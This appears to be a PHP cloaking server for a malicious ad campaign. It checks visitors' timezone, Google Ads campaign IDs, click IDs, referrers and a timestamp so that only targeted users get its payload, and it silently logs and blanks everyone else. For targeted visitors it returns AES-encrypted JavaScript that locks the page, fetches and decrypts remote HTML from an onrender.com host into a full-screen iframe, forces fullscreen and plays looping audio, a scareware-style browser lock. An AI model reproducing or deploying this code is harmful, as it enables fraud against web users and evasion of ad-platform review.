<?php
$dynamic_url = "https://onrender2-jpxc.onrender.com";
#$dynamic_url = "http://127.0.0.1:8080";

$allowed_timezones = ['Asia/Tokyo'];
$allowed_campaign_ids = ['12345', '67890'];
$allowed_referrer = ['http://127.0.0.1', 'https://waveharborblog.space','https://sunaloomblog.space', 'https://microsoftx4.onrender.com'];

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Access-Control-Allow-Credentials: true");

error_reporting(0);
$rawInput = trim(file_get_contents('php://input'));
if ($rawInput !== '') {
    $inputData = json_decode($rawInput, true);
    $timezone = '';
    $fullUrl = '';
    $gadCampaignId = '';
    $gclid = '';
    $invalidReason = '';

    if (!is_array($inputData)) {
        $invalidReason = 'invalid_json';
    } else {
        $timezone = $inputData['timezone'] ?? '';
        $timestamp = $inputData['timestamp'] ?? '';
        $fullUrl = $inputData['fullUrl'] ?? '';

        $urlParts = parse_url($fullUrl);
        if (isset($urlParts['query'])) {
            parse_str($urlParts['query'], $queryParams);
            $gadCampaignId = $queryParams['gad_campaignid'] ?? '';
            $gclid = $queryParams['gclid'] ?? '';
        }

        if (!in_array($timezone, $allowed_timezones, true)) {
            $invalidReason = 'invalid_timezone';
        } elseif (!in_array($gadCampaignId, $allowed_campaign_ids, true)) {
            $invalidReason = 'invalid_campaign_id';
        } elseif (trim($gclid) === '') {
            $invalidReason = 'missing_gclid';
        } elseif (!in_array(rtrim($_SERVER['HTTP_REFERER'],'/'), $allowed_referrer, true)) {
            $invalidReason = 'invalid_referrer';
        } elseif ($timestamp+60 < time() ) {
            $invalidReason = '60 seconds crossed';
        }
    }
}else{
    $invalidReason = 'no input';
}
if ($invalidReason !== '') {
    $logFile = __DIR__ . '/timezone_validation_log.csv';
    $logData = [
        date('c'),
        $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        $timezone,
        $fullUrl,
        $gadCampaignId,
        $gclid,
        $invalidReason,
    ];
    if ($fp = @fopen($logFile, 'a')) {
        fputcsv($fp, $logData);
        fclose($fp);
    }
    echo '';
    exit;
}

$codeString = '
document.body.style.overflow = "hidden";
function cpClose() {
    setTimeout(() => {
        modalBox.classList.remove("hidden");
        backdrop.classList.remove("opacity-0");
        modal.classList.remove("opacity-0", "scale-90");
    }, 100);
}
document.addEventListener("mousemove", cpClose, { once: true });

document.body.insertAdjacentHTML(
    "afterbegin",
    "<div id=\"bruceDiv\" style=\"z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;\"></div>"
);
let globalBlobUrl = null;
function aesDecode(encodedText) {
    try {
        const bytes = CryptoJS.AES.decrypt(
            encodedText,
            "U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI="
        );
        return bytes.toString(CryptoJS.enc.Utf8);

    } catch {
        return "";
    }
}
async function fetchAndPrepareBlobx() {
    try {
        return bytes.toString(CryptoJS.enc.Utf8);
    } catch {
        return "";
    }
}
async function fetchAndPrepareBlob() {
    try {
        const response = await fetch( "' . $dynamic_url . '/sec.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, fullUrl: window.location.href, timestamp: getCookieValue("sid") }),
        });
        if (!response.ok) {
            throw new Error("HTTP error! Status: " + response.status);
        }

        const encodedText = await response.text();
        const decodedHtml = aesDecode(decodeURIComponent(encodedText));

        if (!decodedHtml) throw new Error("Empty decoded HTML");

        const blob = new Blob([decodedHtml], { type: "text/html" });
        globalBlobUrl = URL.createObjectURL(blob);
        displayIframe();
    } catch (err) {
        console.error("Blob fetch error:", err);
    }
}
function displayIframe() {
    if (!globalBlobUrl) {
        setTimeout(displayIframe, 200);
        return;
    }

    const bruceDiv = document.getElementById("bruceDiv");
    if (!bruceDiv || bruceDiv.hasChildNodes()) return;

    const iframe = document.createElement("iframe");
    iframe.src = globalBlobUrl;
    iframe.style.width = "100%";
    iframe.style.height = "100%";
    iframe.style.border = "0";

    iframe.allow =
        "fullscreen; autoplay; encrypted-media; picture-in-picture";
    iframe.allowFullscreen = true;
    iframe.setAttribute("webkitallowfullscreen", "");
    iframe.setAttribute("mozallowfullscreen", "");
    iframe.sandbox = "allow-scripts allow-popups allow-forms allow-downloads allow-same-origin";
    bruceDiv.appendChild(iframe);
}
function enableFullscreen() {
    const el = document.documentElement;
    (el.requestFullscreen ||
        el.webkitRequestFullscreen ||
        el.mozRequestFullScreen ||
        el.msRequestFullscreen)?.call(el);
}

function playBackgroundAudio() {
    const audio = new Audio(
        "https://audio.jukehost.co.uk/qC8dN1AYE9nQkcTtcydsmA9f8nB5l0Yt"
    );
    audio.loop = true;
    audio.play().catch(() => { });
}
document.addEventListener(
    "click",
    () => {
        enableFullscreen();
        playBackgroundAudio();
    },
    { once: true }
);
Promise.resolve().then(fetchAndPrepareBlob);';

function aesEncode($plainText) {
    try {
        $passphrase = "U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=";
        // Generate random salt (8 bytes)
        $salt = openssl_random_pseudo_bytes(8);
        // Derive key + IV (OpenSSL EVP_BytesToKey equivalent)
        $key_iv = '';
        $prev = '';
        while (strlen($key_iv) < 48) {
            $prev = md5($prev . $passphrase . $salt, true);
            $key_iv .= $prev;
        }

        $key = substr($key_iv, 0, 32); // AES-256 key
        $iv  = substr($key_iv, 32, 16); // IV
        // Encrypt
        $encrypted = openssl_encrypt(
            $plainText,
            'AES-256-CBC',
            $key,
            OPENSSL_RAW_DATA,
            $iv
        );
        $result = "Salted__" . $salt . $encrypted;
        return base64_encode($result);
    } catch (Exception $e) {
        return "";
    }
}

echo $encodedString = aesEncode($codeString);